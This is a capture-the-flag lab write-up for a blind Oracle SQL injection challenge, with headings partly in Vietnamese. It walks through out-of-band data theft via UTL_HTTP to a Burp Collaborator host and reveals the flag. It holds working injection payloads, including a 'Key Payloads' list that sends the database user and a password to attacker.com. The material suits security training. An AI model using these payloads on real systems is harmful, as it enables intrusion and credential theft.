# SQLi-038: Oracle OOB HTTP via UTL_HTTP - Writeup

## Flag: `FLAG{oracle_utl_http_oob}`

---

## 🔍 Bước 1: DETECT

```bash
# Response luôn giống nhau
curl "http://localhost:5038/customer?id=1"
curl "http://localhost:5038/customer?id=1'"
```

Không có error message, không có difference → OOB required.

---

## 🎯 Bước 2: IDENTIFY

**Frontend hints:**
- Oracle 21c XE
- UTL_HTTP: Enabled
- ACL: Configured

**Confirm Oracle:**
```sql
1 AND 1=(SELECT 1 FROM dual)--
```

---

## 🔧 Bước 3: ENUMERATE với UTL_HTTP

### Test OOB

```sql
1 AND UTL_HTTP.REQUEST('http://xxxxx.burpcollaborator.net/test') IS NOT NULL--
```

**Burp Repeater:**
```http
GET /customer?id=1%20AND%20UTL_HTTP.REQUEST('http://xxxxx.burpcollaborator.net/test')%20IS%20NOT%20NULL-- HTTP/1.1
```

**Collaborator:** HTTP request received! ✅

### Extract user

```sql
1 AND UTL_HTTP.REQUEST('http://xxxxx.burpcollaborator.net/'||(SELECT user FROM dual)) IS NOT NULL--
```

**HTTP Request Path:** `/APP_USER`

### Enumerate tables

```sql
1 AND UTL_HTTP.REQUEST('http://xxxxx.burpcollaborator.net/'||(SELECT table_name FROM user_tables WHERE ROWNUM=1)) IS NOT NULL--
```

**Tables found:** ADMIN_CREDS, CUSTOMERS, FLAGS

---

## 📤 Bước 4: EXTRACT

### Extract từ flags table

```sql
1 AND UTL_HTTP.REQUEST('http://xxxxx.burpcollaborator.net/'||(SELECT value FROM flags WHERE ROWNUM=1)) IS NOT NULL--
```

**HTTP Request:** `GET /FLAG{oracle_utl_http_oob}`

---

## 🏆 Bước 5-6: EXFILTRATE

**Final payload:**
```sql
1 AND UTL_HTTP.REQUEST('http://xxxxx.burpcollaborator.net/'||(SELECT value FROM flags WHERE name='sqli_038')) IS NOT NULL--
```

**HTTP Interaction:**
```
Type: HTTP
Path: /FLAG{oracle_utl_http_oob}
```

🎉 **FLAG:** `FLAG{oracle_utl_http_oob}`

---

## 🔗 Key Payloads

```sql
-- Basic UTL_HTTP test
1 AND UTL_HTTP.REQUEST('http://attacker.com/test') IS NOT NULL--

-- Extract data via HTTP path
1 AND UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) IS NOT NULL--

-- Extract with URL encoding for special chars
1 AND UTL_HTTP.REQUEST('http://attacker.com/'||UTL_URL.ESCAPE((SELECT password FROM users WHERE ROWNUM=1))) IS NOT NULL--
```

---

## 📊 Summary

| Step | Action | Result |
|------|--------|--------|
| DETECT | No response difference | OOB required |
| IDENTIFY | Oracle with UTL_HTTP | ACL configured |
| ENUMERATE | HTTP OOB extraction | Found flags table |
| EXFILTRATE | Extract flag via HTTP | FLAG{oracle_utl_http_oob} |

---

## 📚 Notes

- UTL_HTTP requires ACL configuration in Oracle 11g+
- HTTP method allows seeing data in request path/params
- Can also use POST method for larger data
- URL encoding needed for special characters
